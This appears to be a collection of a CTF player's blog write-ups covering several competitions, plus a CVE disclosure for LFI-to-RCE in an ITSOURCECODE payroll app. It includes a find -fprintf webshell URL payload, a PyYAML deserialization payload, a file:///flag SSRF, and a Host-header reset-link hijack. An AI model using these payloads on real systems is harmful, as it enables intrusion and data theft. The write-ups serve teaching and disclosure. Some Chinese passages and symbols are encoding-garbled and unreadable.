entry.title: QnQSec CTF 2025 Official Writeup by Whale120
entry.content:
Before all

Hello guys, this is Whale120 here, I contributed two medium crypto, two short web and an interesting concept pwn challenges for the QnQSec CTF 2025 this year. Hope u all like them!
Down below are my official writeups for them ğŸ˜‰, first tkx to qawse for lending me a helping hand to debug the pwn challenge, and members that accepted my short delay on handing in my challenges â€¦

Web

Two (too) easy web challenges :>

Date Logger

A simple piece of PHP on Apache!

The website will search your post content inside a list of diary notes, and log it into your session â€¦ thatâ€™s all, no return of any values!
Letâ€™s forget about the XSS vulnerability since thereâ€™s no XSS bot here.
So we have to do some side channeling attack, since extract the value of php session info doesnâ€™t seem to be that feasible (and also, we have our session destroy).
Wait, session ?!
Actually, in PHP, a session will store in a file like /tmp/sess_<PHPSESSID> in our challenge, because of this, php disabled many characters inside the PHPSESSID value, limit the size of a session id to prevent some bugs.

So if you put some stange values inside your PHPSESSID cookie:

A warning message will be triggered! (Apache default)
Whatâ€™s more, the message will be triggered again at the session_destroy function, which in the challenge, it means we have a matched the search result, so we can perform a side channel attack based on the error message, especially we have the prefix of flag!

exp.py

FaaS

Welcome to the Find as a Service

A straight forward challenge:
Bypass the filter!

Since all command injection, shell I/O method to write shell are all blocked, so is time to think about argument injection because - is not blocked

The find command has an injection method to done file write:
find / -fprintf "FILE_NAME" DATA -quit
write DATA into FILE_NAME
but either we want to write to the .htaccess file or write a php file to get shell, the forbid chars like < or > are all necessary

2 Features:

  • TAB (%09) can replace SPACE character
  • In fprintf param, an oct presented character is allowed, like oct(ord('[')) = 0o133, then printf("\\133") will act the same.

Combine the tips up there, we have our final payload:

http://192.168.73.128:8888/?cmd=%09/%09-fprintf%09shell.php%09%22\\74?php%09system\\50\\44_GET\\1330\\135\\51\\73%22%09-quit

then
http://192.168.73.128:8888/shell.php?0=/readflag i want the flag please

Crypto

Republic of Geese

A secret sharing scheme through power under $Zmod(p)$

Weâ€™ll have 11 values $\prod \space pub_i ^ {\space \space crc32(secret_i)} (mod \space p)$ where $i$ skip one of the 11 numbers every time, pubs are public.

A quick observation is that p is smooth, so dlog problem on it is easy to solve.

Then weâ€™ll have:
$checker = \prod \space pub_i ^ {\space \space crc32(secret_i)} (mod \space p) \space where \space i \neq 11$

=>
$log \space checker = \sum \space [log \space pub_i \cdot crc32(secret_i)] \space (mod \space p) \space where \space i \neq 11$

Since $p \simeq 2^{1185}$ but the crc32 outputs are only 32 bits which should be much more smaller then $log \space pub_i$ we estimated under $Zmod(p)$ , is feasible to solve the correct small root for the linear equation via $LLL \space algorithm$

Later just some trivial stuffs ä¹( Ë™Ï‰Ë™ )å‚, and since other geeseâ€™s private keys are only 3 bytes long is feasible to brute force directly

exp.py

ğŸ¿ğŸ“

helper.py
helper.py give out a strange prime number generator, generates $N=pq$ for the Elliptic Curve later.

The two primes p1, p2 will be like:
$$
\begin{align}
& p_1 = step \cdot base_{prime} + 1 \newline
& p_2 = (step+\epsilon) \cdot base_{prime} + 1 \newline
& where \space \epsilon \sim 10^6
\end{align}
$$
Then:
$$
\begin{align}
& N=p_1 \cdot p_2 \newline
& = (step \cdot base_{prime} + 1) \cdot [(step+\epsilon) \cdot base_{prime} + 1] \newline
& since \space \epsilon \space is \space small \space enough \newline
& \sim (step \cdot base_{prime})^2+ 2 \cdot step \cdot base_{prime}
\end{align}
$$
So is feasible to obtain a estimated value for coeff step by solving a quadratic equation, later just brute forcing can factor N!

Next is the main challenge file:
It do a Elliptic Curve point multiplication as an oracle with an interger user input over $Zmod(P=p_1 \cdot p_2)$, with a multication with flag first provided.
The strange part is that the modulus P wont be provided â€¦
chal.py

The goal now is first to recover the modulus P
Actually, based on the point multiplication formula we know that when doing point doubling, we will have:
$$
\begin{align}
&P_1 = (X_1, Y_1) \newline
&P_3 = (X_3, Y_3) = 2P = (\frac{(3 \cdot X_1^2 + a)^2}{(2 \cdot Y_1)^2}- 2 \cdot X_1, \space \space \frac{3 \cdot X_1^2 + a}{2 \cdot Y_1} -X_3 - Y_1)
\end{align}
$$

Notice that the outcome of $P_3$ is not related to the initial value of $P$, and also we can first do the calculation under $\mathbb{Z}$, via switching some coefficients, then will have:

$$
\begin{align}
&X_3 \cdot (2 \cdot Y_1)^2 \equiv (3 \cdot X_1^2 + a)^2 - 2 \cdot X_1 \cdot (2 \cdot Y_1)^2 (mod \space P)
\end{align}
$$
Same for Y coordinate, and obtain serveral values, subtract them and do GCD we can find the value of P

Later, since $P_1,P_2$ should be kinda smooth, just pick some small factors inside the order for them, solve dlog for them via Pohlig-Hellman, after the bit count is enough, we can obtain the value for flag through CRT! (brute through +/-)

Pwn

Catâ€™s lottery

Letâ€™s first disasm the file:
Easy to see that we should try to return to the function whale_is_so_cute â€¦

A multithreading program opened on port 1337, after some reversing weâ€™ll find that thereâ€™re two structures, letâ€™s call them user and ticket

The comunication through client and server side is based on the fd number, it will open on file /proc/self/fd/<fd_id>

Letâ€™s check client_handler function

While registering for a new account, thereâ€™s a off by null bug that if a user inputed a username with length greater then 8, the 8-index char will be change to NULL, which in our struct is actually the fd numnber
Whatâ€™s more?
When a connection is closed, it will free a chunk based on the client fd number as a global arrayâ€™s index, without cleaning the pointer
So if we have two clients both with fd = 0 caused by off by NULL, a double free will appear.

Last, letâ€™s take a look at the hack switch:

Though it checks the index for the ticket structure to make sure no OOB write will appear, but thereâ€™s a race condition that after the check passed til we entered hack (Y/N), combine the double free previous we can change the value for a checked ticket via double free, just register a new account and point the index value to the corresponding slot of the return address, jump to win function (whale_is_so_cute), connect to the server again then weâ€™ll get the flag!

After all

Just a short storyâ€¦
Letâ€™s guess how long it took me to done all challenges~?
Two daysâ€¦because I procrastinated and also busy these days actually
And I was like â€¦ getting INSANE, also becuz Iâ€™m so afraid that GPT and other LLMs are stronger and stronger day by day â€¦ so I have to pick some topics or ideas thatâ€™re nearly never been seen online before â€¦

So I started to do some Graffiti â€¦ procrastinating again

But I was just like â€¦ many geese â€¦ hey, why not letting them doing some secret sharing ???
Yep, I must be crazy XD
The sharing scheme was based on powers and modulus as u seen above :)

Yep, this is all my post today becuz itâ€™s too late and Iâ€™m going to sleep (also maybe prepare for my midterm exam â€¦)

entry.title: CVE-2025-57257 - An Accidentally Discovered 0-Day While Playing HackTheBox
entry.content:
Before All

CVSS 9.8/10
CVE-2025-57257: ITSOURCECODE Payroll Management System Pre-Auth LFI2RCE
Not a famous one, but it comes with some funny stories :)

https://itsourcecode.com/free-projects/php-project/payroll-system-php/

Hello there, Iâ€™m Whale120 (William Lin / LIN, CHIN-YU) (yep, all are me).
After I accidentally discovered a 0-day last year â€” which was also my first CVE record (CVE-2024-35515) â€” I stumbled upon another one again this summerâ€¦

This paragraph is mostly for MITRE to release the 0-day information. And honestly, this vulnerability probably wonâ€™t ever be patched since ITSOURCECODE has never really done so, which is why MITRE made me publish this.

Speaking honestly, Iâ€™m still a learner/CTFer and not a full-time researcher yet. I usually prefer short-term bug bounties, VDPs, or national attack-and-defense drills. You can find more info on my About page (including hacking NASA, Taipower, Taiwater, some tech/e-commerce companies, governments, and educational organizations). So for me, reporting CVEs happens purely by accident, since thatâ€™s not my main mission. But I do plan to change this within one or two years â€” spending long-term effort on a single project/product (if Iâ€™m still majoring in this field).

Story Time >_-

While preparing for my CPTS exam this summer, I tried some machines on the â€œUnofficial CPTS Prepâ€ track edited by IPPSEC on YouTube.

One of the boxes on the list was â€œTrick,â€ which is actually an easy one.

After obtaining login passwords through directory scanning, I noticed there might be an LFI vulnerability in index.php. However, it was locked to files with a .php suffix, meaning only existing PHP files could be loaded.

But thinking back to the great PHP Filter Chain attack triggered by the include function in PHP, the only requirement is a valid filename. Even something like php://temp.php with a wrapper works, since it just returns an empty PHP stream.

So, a PHP Filter Chain attack seemed possible. Even more interesting, after validating a userâ€™s identity, the program didnâ€™t immediately die() but instead redirected, which led to an EAR (Execution After Redirect).

After I finished the exploit, escalated privileges, and submitted the flag, I glanced at the official write-up and was likeâ€¦ WTF, thereâ€™s a SQL Injection CVE just sitting on the login page???
Out of curiosity, I searched for existing CVEs on this project:

Emmâ€¦
SQL Injection

SQL Injection

AAAAAAAAAnother SQL Injection

And none of them were patched

How can these guys only think of SQL Injection? Since I didnâ€™t find any report about this LFI case, I decided to write it up.

ä¹( Ë™Ï‰Ë™ )å‚

I did try to contact the vendor, since some companies still use this project (or related ones), but they never replied.

So hereâ€™s a call to every developer and sysadmin: please, check your inbox for all emails. Even if a message looks like â€œHey, I hacked into your company today,â€ trust me â€” only white-hat hackers will bother notifying you.

And also, please use more reputable open-source projects like WordPress (or its related ones), and remember to keep them updated (sighâ€¦).

PoC and Source Analysis

From lines 13â€“15:

The EAR part â€” missing a die() or other exit functions.

From lines 44â€“45:

The LFI vulnerability. The prefix is controllable and triggered by include, making a filter chain-to-RCE exploit possible.

PoC:
Using the script:
https://github.com/synacktiv/php_filter_chain_generator/blob/main/php_filter_chain_generator.py

After All

What will be my next public CVE report? 0w0bbbb.

Rank 3 / Team: CakeisTheFake

è²¬ä»»å€çš„ Web å’Œ Crypto éƒ½æœ‰åšå‡ºä¾†ï¼Œé›–ç„¶æˆ‘ Crypto åªæœ‰åšä¸€é¡Œç”¨ ChatGPT å¹¾ä¹ä¸å¯è§£çš„é¡Œç›®ï¼Œä½†æˆ‘å­¸é•· @unicorn ç¡¬èŠ±è‘—ä¸€ä¸‹åˆç”¨ GPT æ‰“å®Œäº†ï¼Œä½†æˆ‘å¾ˆå¿«é¦–æ®ºæ‰äº†å®ƒ :)ï¼Œæ„Ÿè¬ SmileyCTF å‰é™£å­æ‰æé†’æˆ‘é€™å€‹å•é¡Œçš„å­˜åœ¨æ€§(x)

å°±ä¾†å¿«é€Ÿ Writeup ä¸€ä¸‹å§ï¼Œå…¶å®ƒå°±æ˜¯ Web å¤ªç°¡å–®ï¼ˆç·šæ€§èª¿åˆ†ï¼Œä¸‰é¡Œåˆ†æ•¸åŠ èµ·ä¾†é‚„æ²’æœ‰ä¸€å€‹ã€€Pwn/Crypto é«˜ï¼Œé€™æ¨£å°å—wwwï¼‰

å–”é‚„æœ‰å°±æ˜¯ï¼ŒMisc åˆ°åº•æ€éº¼çŒœåˆ° ?id=1 å¯ä»¥æŠŠ 1 æ›æˆ /etc/passwd LFI å’Œä»€éº¼æ³¡èŠ™é˜¿å§¨æ€ª Stego é¡Œç›®ï¼ŒMisc å‡ºé¡Œè€…è…¦æ´çœŸçš„é —å¤§ï¼Œé¡Œç›®å“è³ªè½å·®æœ‰é»å¤§

å…¶å®ƒå†·çŸ¥è­˜ï¼ŒåŸä¾†é€™å ´æ˜¯ä¸­ç§‘é™¢è¾¦çš„

Secret In Frame revenge

entry.title: No Hack No CTF 2025 Official Write Up - Whale120
entry.content:
Before all

Welcome to the No Hack No CTF Event this year, I made some â€œrelatively harderâ€ crypto and web challenges in the event, with some â€œrelatively easierâ€ ones.
And one guessy challenge, which is just a pure waste of time

Hope u guys love them, and â€¦ actually, I didnâ€™t expect like as much as like 400~500 players will participate in this yearâ€™s rating 0 event, with some strong teamsâ€¦so the challenge difficulty may not hard enough XD

After all, I think u can probably looking forward to my(our) challenges next year, trust me, will be funnier!

Web

Actuallyâ€¦just picking categories my teammates havenâ€™t done yetâ€¦
But all my favorite ones in web category!

XXS XSS

  • Difficuly: 5/10
  • Tips: Open Redirect to XSS(javasciprt: protocol trick)

A XSS Challenge
Just take a look at this part:

You can set a name that the website will show on your screen, also, a redirect url with length < 15
Itâ€™s seemingly that the only way to exploit XSS is to abuse the redirect function, but how can we steal the cookie with like less then 15 chars (contains javascript: string)

A fun feature: if javascript: url was appended with a javascript variable, then the page will render the variable value

So just put the payload at name, and then redirect to javascript:name can solve it!
Final Payload:

When?

  • Difficuly: 6/10
  • Tips: Nginx /file../ LFI Bug + Attacking PHP-FPM

A cute black box challenge, with a view-source, we will find a /file directory (favicon.ico location) allow listing:

Query some strange stuffs like /file/whale will leak that itâ€™s hosted on NGINX, or via guessing

In nginx config file, itâ€™s well known that this kind of setting will lead to path traversal for one file layer:


take a look at socket-test-8cb09a.php~

through nginx.conf, weâ€™ll also find that itâ€™s based on php-fpm, which is vulnerable via changing its setting auto_prepend_file = php://input and allow_url_include = On, after that, every post body (pass to php://input) will be seem as a php code and excute.

In this step, thereâ€™re many exploits online like this one: https://gist.github.com/Jimmy01240397/c833ef20bac520ce8212147fb8457d1a, by my friend chumy.

with the socket backdoor, just pass the payload(base64 encoded) to it and weâ€™ll obtain a shell!

NOT XSS

  • Difficuly: 9/10
  • Tips: XSLeak (Via Cookie Size, STTF)

A word guessing game, target is flag, but only admin bot can visit it and also, with CORS.
The best match value and a note (will be rendered with HTML) will be stored in cookie

The stored note will be rendered, but with a DOMPurify Protection!
Just donâ€™t mind those PoW stuffs, as I said above, itâ€™s impossible to do a XSS, so time to think about XSLeak.

app.py

index.html

Every time I deal with a XSLeak challenge, I think itâ€™ll be very usefull to think about whatâ€™s the diffrences between a â€œrightâ€ hit and a â€œwrongâ€ hit.

In this challenge, is the cookie matters.
Nowadays, almost every browser has a limit size for its cookie. Combine this feature with a render functionality in index.html, we can construct an â€œerror-basedâ€ XSLeak with an oracle of â€œif the webhook server is hitted or notâ€

Just a piece of PoC:
index.php, which the admin bot will visit

exp.html

Like this, if NG was hitted on the server, but not NH, then we knows that NH is the prefix part of flag.
Later, just automate this approach with a backend server dynamic changing exp.html â€¦ should be fine â€¦ if my VM wasnâ€™t broken
So sorry for uploaded an old, unsolvable version on CTFd QwQ

Crypto

This was what I said last yearâ€¦

bloCkchAin ciphErâ€™S sERcret

  • Difficuly: 2/10
  • Tips: Baby Blockchain + Baby Caeser Cipher
    Challenge Description: chal.sol I used Remix IDE, just take it easy if u know some more powerful tools !
    With some trials, youâ€™ll find out that encrypt is just a caeser cipher with key = 7.

run get_flag and â€œDECODEâ€ it with key = 7 will get the flag

ğŸº Verifier

  • Difficuly: 6/10
  • Tips: MT19937 + BroadCast Attack

Exploit Scripts for the series are from my teammate @wang, thanks a lot to her for testing my challenges.

Wellâ€¦ the challenge has three parts!

  1. Predict MT19937 Generator with 64 bits random number generated everytime.
  2. Obtain N from leaked signatures and OTPs.
  3. Recover Flag.

Step 1 is trivial while MT19937 is just a $GF_2$ linear equation problem, there was like a bunch of exploit scripts online especially for 2**32 sizes numbers, which can actually be implanted to python random lib as seeds XD

Step 2:
Via $gcd(OTP_1^{37}-signature_1, OTP_2^{37}-signature_2, OTP_3^{37}-signature_3, â€¦) = N$
Step 3:
We can get a bunch of FLAG^37 taking mod with different Ns by connect to the server many times, just a simple broadcast attack!

exp.py

ğŸº Verifier +

  • Difficuly: 7/10
  • Tips: MT19937 + Franklin-Reiter Attacks

Just note that weâ€™ll obtain 65 bits random numbers everytime, and flag will be masked by addition then encrypt.

With two addition(linear related) ciphertexts, itâ€™s well known to perform Franklin-Reiter Attack, its principle is changing the relations into polynomials and GCD them under Zmod(N).
exp.py

ğŸº Verifier Max

  • Difficuly: 8/10
  • Tips: MT19937 + Franklin-Reiter Attacks + AGCD

DIFF: signatures losing their last 65 bits.
This is a AGCD Problem this time.
If you havenâ€™t seen that before, I strongly recommend to see some posts like: https://martinralbrecht.wordpress.com/2020/03/21/the-approximate-gcd-problem/
Itâ€™s principle is to turn the relation into a linear equation which roots are much more smaller than coefficients, just a classic LLL condition.

An easy construct of lattices may be like this:

it should came up with something like (sign_1^37-OTP_1)//N', the Nâ€™ value may be like N*(small number), just do it more times and GCD them.

Reverse

Yep, a crypto&web player auditing reverse challenges, somehow is because someone delayedâ€¦

Yep another smake game

  • Difficuly: 3/10
  • Tips: Godot, WASM Game Hacking

yep, another snake game.
Via view-source or F-12 console logs, we can easily spot thatâ€™s a godot game.
Thereâ€™re a bunch of Godot unpackers online, but actually I made this challenge after I saw this:

Whatâ€™s more, thereâ€™s a tool based on this talk, just with the same usage with CheatEngineâ€¦

https://github.com/Qwokka/Cetus

With this issue, we learned how to modify values!
https://github.com/Qwokka/Cetus/issues/76

IECD-SHELL

  • Difficuly: 3/10
  • Tips: NodeJs, Malware

A malware+packet was provided

Seems to be a nodejs pkg packed exe
unpack via https://github.com/LockBlock-dev/pkg-unpacker/tree/master, found AES Key and method (CBC)

AES CBC Mode is based on key + IV

letâ€™s see more â€¦ because Iâ€™m to lazy to read those js byte codes XD
open the pcapng file with WireShark, follow TCP Streams, the client first sent a 16 bytes string to the machine, then they start comunicationâ€¦ ?!

The string probably be the IV value XD

PWN

Server Status (and revenge)

  • Difficuly: 4/10
  • Tips: Shared Memory Attack

A privilege escalation challenge with a SUID TOCTOU in it, and yep, this challenge was made in a hurry so I made some stupid mistakes.

Decompile the program via IDA.

When the program started

It gets a shared memory block with a key_t generated by rand via time(NULL) as seed, and puts our command dmesg into it.

Later it will run the command after a short period of sleep

Last, it will just run the shared memory block as a command.

Since linux shared memory structure can be access by different process, we can edit the shared memory blocks with keys generated by random around the time, change the command and get shell!
exp.c

But I forget to use a full PATH like /usr/bin/dmesg, so a PATH abuse can be done

GuessyCTF

GuessyCTF

Just a pure waste of time
After all, have fun (cuz this is just for fun) and relax XD
I was just like, oh, why not making a challenge fullfill as much as possible boxes on the â€œBad CTF Bingoâ€
Letâ€™s go!


Steps
Step 1. Extract GIF and get â€œURLâ€

Step 2. nc to it! is a calculator, and also, 42 is the best answer

Step 3. Decrypt the message with keys in discord servers!

Yep, like this
key characters or words are all inside < and >

Step 4. Find a wierd twitter guy and crack his blogâ€™s password via SQL Injection

Or

Take a look at my github
https://github.com/William957-web/My-CTF-Challenges/blob/main/README.md#2024-%E6%98%A5%E5%AD%A3%E7%A4%BE%E5%85%A7%E8%B3%BD

In here: https://hackmd.io/@Whale120/S1drvBYlR#/ has a solution for this XD

After all

entry.title: HackTheBox Bug Bounty CTF 2025 Write Up
entry.content:

entry.title: x3CTF 2025 (feat. mvm) Writeup
entry.content:
Before all

Rank: 27
Team: ICEDTEA
I participated in this cute CTF with ICEDTEA as my last CTF before chinese new year, and I almost AK all Crypto Challenges â€¦ (Except BabyRNG)
After all, I really love these cute challenges and they can also be a good piece of lecture to my junior teammates in ICEDTEA!

Writeup

Crypto

man-vs-matrix

challenge.py

This is a RNG with an initial state â€œMvmâ€ with every 3*3 matrix input (splitted from the flag with 3 chars a set).
Itâ€™s trivial that the state is always predictable in the 9 operations rng.get_random_num()(exponential), and the output value is actually a linear sum with the input matrix and old state*new state as paired parameters.
With 9 output values, the problem would become an easy linear equation (because thereâ€™re also 9 unknown variables).
exp.sage

sourceless-crypto

A black box crypto challengeâ€¦
First tested with â€˜aaaaaaâ€¦â€™ and found out the key value is in some order(like increasing but not), also the max input size is 197 chars (256-len(flag)), so the key may be a permutation of ASCII chars.
Later tested with â€˜abcdefâ€¦â€™ and obtained something like this:

Cool, some repeated pairs of charaters appeared many times, maybe about bitwise operationâ€¦XOR?! (because of the LSB, and I guessed the key is in some kind of order)
To prove my concept, directly connected to the server two times with diffrent inputs, the xor value between the ciphertext and plaintext are all the same, tada~
Last, just observed that the key permutation is a change of order from 0123 to 0132 (same for other sets of numbers).
exp.py

This challenge should be renamed to GUESSY-crypto
Btw, I love this sense of humor!

curved-mvm

A signer based on fastecdsa.
Player have two operation chances and the operations are:

  1. Obtain a signed message.
  2. Sign a specify message back, check the value and get the flag if correct.

server.py

Take a close look at function sign_msg

We would get the value of R, since the value of k is too small, itâ€™s feasible to bruteforce/discrete_log on R and obtain the value of k.
After that, the value of k, z, r, n are all known so the value of SECRET_KEY would be leaked, just simply sign a message back and get flag!
exp.sage

With connection by hand.

fastcrypto

An RSA CRT service which itâ€™s multiplication is based on NTT Algorithm.
chall.py

Is suspecious of chosing a B value 7639, an uncommon prime which is quite too small and would have some bias while encountering higher coefficients.
So itâ€™s probably feasible to do a RSA Fault Attack if the output value is wrong!
The exploit tells everything â¬‡ï¸.
exp.py

rubiks-dsa

A cute cryptosystem based on rubiks cube ?!
Thanks for telling me thereâ€™re rubiks inside sage, I love this one!
chall.sage

Take a look at the spicy_rubik_pow function:

I would call it a base for every permutation group (P * C._state)**k, and thereâ€™re only 1185 bases.
After some trials, the order of those bases are quite small, so itâ€™s DLP can be solved with discrete_log function â€¦

Next is the signer:

After solving the value of k from discrete_log of r (brute force all bases and find the right one), the rest values like hash_to_int(msg), r_hash are trivial so that the value of d can be recovered (which is the secret key).

Finally is the encryption with those keys:

Itâ€™s a linear operation with the size of keys are much more larger than ASCII chars, which can simply calculated with LLL after obtained the keys.
Btw, 4 chars are actually able to brute-force

sol.sage

Web

submission

A web service that user are allowed to uploads .txt files, and they would be moved to /upload folder and:

The flag is also inside /upload folder.
Actually, itâ€™s dangerous to use a wildcard parameter like * directly inside a command cuz it would probably leads to a wildcard injection vulnerability.

For example, if thereâ€™s a file named --help inside a folder and doing find *, a manual would pop out cause the --help file name were seen as a parameter passwd to find command

Next, thereâ€™s a --reference=<file name> option in chmod command which would change all files into the same permision as <file name>.

Exploit Step:

  1. upload a file named .txt (be shown as a hidden file in linux file system, wonâ€™t be listed in *)
  2. upload a file named --reference=.txt (change all files permission same as .txt, which would be readable)
  3. read flag~

Misc

Playing with the certâ€¦

mvm

Change all M into 0 and V into 1, binary decode and got a piece of brainfuck code, solve them with online decoder.

trophy-plus

With the idea from challenge â€œmvmâ€, I found that thereâ€™re some tiny MVM aroung the cert, probably the same concept?

And the answer is â€¦ yep!
But tearing my eyes, actually â€¦

trophy-plus64

Another Human-based OCR

Thereâ€™s a REAL Certification on the stamp at the corner of the cert, after base decoded the first few lines a flag like string appeared â€¦ (Thanks a lot to my teammate wang for this).
After that, I just guessed the correct flag!
{mu5t_b3_feo_typ1ng_th1r_by_h4nd_1375105304248361} => {mu5t_b3_fun_typ1ng_th15_by_h4nd_1375105304248361}

entry.title: KnightCTF 2025 Write Up
entry.content:
Before all

Team: QnQSec
Rank: 14/759
I participated in this CTF with team QnQSec, and I was assigned to solve those web challengesâ€¦ which I donâ€™t like them (in this CTF) as well.
They are easy but some are quite guessy, and I also encountered serveral infra issuesâ€¦

Write Up

Knight Connect

An under maintainence live-chat app which only itâ€™s login function was well implemented.
Take a close look at the loginUsingLink function in /app/Http/Controllers/AuthController.php:

Itâ€™s verification based on the bcrypt value of email|time, which is 200% can be self modified and spoofâ€¦
But the part is whatâ€™s the bcrypt salt round?
Wellâ€¦ the result is that the round number is ten, WTF?

Just sign my token with bcrypt(10 rounds), or easier just simply use online generator (link)

Btw, these are all possible admin emails â€¦ ?

Baby Injection

A black box challenge, url: http://172.105.121.246:5990/eWFtbDogSXRzIHlhbWwgYnJvLCBoYWNrIG1lIGlmIHlvdSBjYW4hISE=
Base64 decoded: yaml: Its yaml bro, hack me if you can!!!
Also, itâ€™s a Flask web app

So my idea comes to the classic PyYaml deserialization vulneravility:
Info: https://net-square.com/yaml-deserialization-attack-in-python.html
Payload: yaml: !!python/object/apply:subprocess.getoutput ["ls -al"] (ofc, base64 encoded)

aha â€¦ WT â€¦

Exceeding Knight

Another Laravel PHP application
After some observations, I found out that:

  • The flag is inside .env file
  • Debug mode on

Base on the challenge souce code, there are serveral methods to trigger an error message with .env leakage, I used the one in the calculator function:
/app/Http/Controllers/CalculatorController.php

If the interger I input is greater than env('MAX_CALC_LIMIT', 100000);, an error response with environment variables would pop out.

Admin Access

A blackbox challenge with a password reset function, login to adminâ€™s account to get flag!
I found that thereâ€™s an email address: wrapped with html comment below every response

So kctf2025 and the email addr probably be the adminâ€™s credential, and after some trial and error, if I self modified the Host Header in my reset request, my listener can get the password reset link

PortSwigger Host Header Attack (link)

Post to http://45.56.68.122:7474

Listener:

Flag:

https://factordb.com/index.php?query=22338831...

æ¥ä¸‹ä¾†ç”Ÿæˆç§é‘°ï¼š

ç°½ä¸€å€‹ token å›å» (python2 çš„ pyjwt)

æ¥ä¸‹ä¾†ç™»å…¥ç¶²ç«™æœƒçœ‹åˆ°æ–‡ä»¶è®€å–çš„åŠŸèƒ½ï¼Œæœ‰ LFIï¼Œç¶“éè®€å– /proc/self/cmdline å¾—åˆ°æª”å 5up3r_53cur3_50urc3_c0d3.jsï¼Œcode review å¾Œæ‰¾åˆ° secret-flag é€™å€‹ package
è®€å– /usr/src/app/node_modules/secret-flag/index.js å°±æ‹¿åˆ° flag ã„Œ

Crypto

entry.title: My Writeups for some challenges in No Hack No CTF 2024
entry.content:
Before all

Author: whale.120

CTFTime Link: https://ctftime.org/event/2574/
This CTF was held by my CTF Team ICEDTEA(link to CTFTime), it was for those newbies in Cyber Security (at first).

But to satisfy those skillful player, I still generated some â€œtougherâ€ challenges â€¦ here are there writeups~
I done the writeup for those harder challenges since those easy ones could be answered on our DC channel/GPTable/Googleâ€¦â€¦
Hope you enjoy them~

Lion RSA

With a HINT about LLL algorithm, you may take a look at it first: Introduction on CTFTime(link)

(This is also what I want those newbies who were trying to solve this challenge can learn from the CTF!)

Anyway, for those who would have headache after seeing the definition on wikipedia, I would explain it as easy as possible here:
For a matrix like this:

You can find some short(may be the shortest) linear combination originated from the three vectors up there.
ahhâ€¦
Linear Combination is something like this:

The short one is the length in N-dimension(in this example, 3) coordinate space.

Back to the challenge:
Source Code:

The main part for the challenge is to recover the primes value through the given Diophantine(indefinite) equation, which can done by constructing this matrix:

and calculate its LLL reduction.
Why?
This is your homework :P
Using sagemath to done the solve script would be the easiest way since it has a LLL inate!

Solution.sage

Lion Prime

This challenge had been solved by a VERY EASY unintended method so I made a revenge one XD.
Source Code:

The first part of the challenge is to deceive my lion_prime function (which is doing Miller-Rabin primality test) by giving three factors(f1, f2, f3 and f1*f2*f3==p), though I blocked the use of 1, I didnâ€™t block -1â€¦(Thanks a lot for telling me @eggroll(OAAAO))

After that, is easy to see that if the logs array is only [0], it would pass the checker function 100%
So the exploitation was just likeâ€¦
Keep trying until the oops value is a prime->
Input factors -1, -1, oops->
Enter 0 and get flagâ€¦

Lion Prime Revenge

Source Code:

The only change is the input check for factors:

Nah, preventing UNINTENDED solution up thereâ€¦

Step 1.

Ok, first of all, is well known itâ€™s possible to bypass Miller-Rabin test by using Charmichael Number:
https://crypto.stackexchange.com/questions/12776/is-it-possible-to-fool-miller-rabin-test

About how to generate them:
https://math.stackexchange.com/questions/2295095/what-is-the-fastest-way-to-get-the-next-carmichael-number

Ok, now you can find a bunch of pseuodo primes to deceive the lion_prime testerâ€¦

Step 2.

Take a look at checker function, the x value should pass this:

This equaltion wonâ€™t satisfy unless x==0, Iâ€™m not going to do the math since itâ€™s not necessary for this challenge (proof by getting the flag).
But theirâ€™s a similar and detail proof here: https://artofproblemsolving.com/community/c6h3107338p28104291

But how can the x be 0 since itâ€™s multipled by some fake primesâ€¦
Wait until itâ€™s a pseuodo prime would be a good choice but a long time lasting work

Step 3.

OVERFLOW, the max long int size in numpy is 64 bits, and in python3, the max length for an int type variable is 4300â€¦

Bypass patch function: 4300 digits overflow,
Make x=np.array(datas[:60]).prod() become 0: just make the value modulus 2^64==0

Exploit!!!

My method is generate some pseuodo primes which is not large(to make it faster in multiplication in numpy) first, and then generate some bigger one:
Generator.py

Exploit.py

wait until the oops value is an odd one, and run the script to get flag!

POPcorn

POP Chain: https://portswigger.net/web-security/deserialization/exploiting#creating-your-own-exploit
You can learn from the starting point if you havenâ€™t learned about serialization vulnerabilities.

The flag is in /flag

The main source part:

The POP Chain:
Trigger the chain by __destruct method in TEST ->
Using the preg_match function to call __toString in MEOW ->
Trigger __get in WHALE by $this->id->r3a1_name in the previous __toString
Finally, SSRF in this part:

curl file:///flag can get flag!

Exploit.php

meow~

entry.title: BugDB Series on Hacker101CTF
entry.content:
Before all

The two challenges are both about GraphQL, and I just used the corresponding tools burp suite provide to solve them!

Reference(Port Swigger):https://portswigger.net/web-security/graphql

BugDB v1

introspection

Introspection is a step for schema information discovering.
Just type some stuffs and send it, meanwhile, right click on that history (in Burp Suite) and send it to responder.

In the request part, change to the GraphQL view and set an IntrospectionQuery.

Next, send it to sitemap, then feasible queries for the api are all in the target page!


Finally, I chose a query and send it to Repeater, removed all the variable params, and dumped all â€œallBugsâ€ datas!

BugDB v2

introspection

Same as I done up there, but this time thereâ€™s a mutation function availible!

And also, if I directly use the query access â€œallBugsâ€ just like the way I did before, thereâ€™s only an admin report but not the victimâ€™s one.

mutation

Mutation is a process which is used for making changes to datas.
Furthermore, thereâ€™s a â€œprivateâ€ paramter in the extracted data.

So, for solving this challengem, just change the â€œprivateâ€ value for the Bug with id=2 into â€œtrueâ€ through mutation!


P.S. Just remember that DONNOT change the text value LOL.

entry.title: Encrypted Pastebin on Hacker101CTF
entry.content:
Before all

To my surprise, this is a three years lasting journey on solving this challenge â€¦

This is an interesting challenge combined several simple technique and is well worth solving!

Write Up

This is a web application which has a posting function just like Pastebin, after you sent a post, it would generate a unique key for that post, you can see the post only if you have the right key in the url.

Also, base on the paragraph in the home page, the key is probably generated with AES-128 CBC Mode.

RECON

A url example is down below.
https://669099f2c694bc3cf1c1f5ae19016f77.ctf.hacker101.com/?post=KWJlR2cCCcGYhMBdPSotLiWdHcoNMiYSSTNoRL9zfRTLGTFdFdu9xBxiXc9SJFQ5NEGkB90mbkF-zvdqnoT4X2fQykzaXWCMY7CX3IwyYXRnAAICk4d98bTrUHXRVENpfQ5sANV9fGIDT-eWO4EUD4H2nSL5egynC6TAfEXoRzs92SQLeu7V1JLc06I5-WraCOH38VOdkr-jmQYRZ!cgTQ~~
First of all, I tried to change the key value and observe the response.

But after I simply added an â€˜aâ€™ to the front of the â€˜postâ€™ param, I got a response like thisâ€¦

First flag gotten!

How if I change the key into a single character â€˜aâ€™?

https://a49c182743e0b433bba6232c5961b860.ctf.hacker101.com/?post=a

It shows that it is base64 encode but with some naughty changes on it.

Also, if I add some padding in the â€˜postâ€™ parameter, it would raise a PaddingExceptionâ€¦

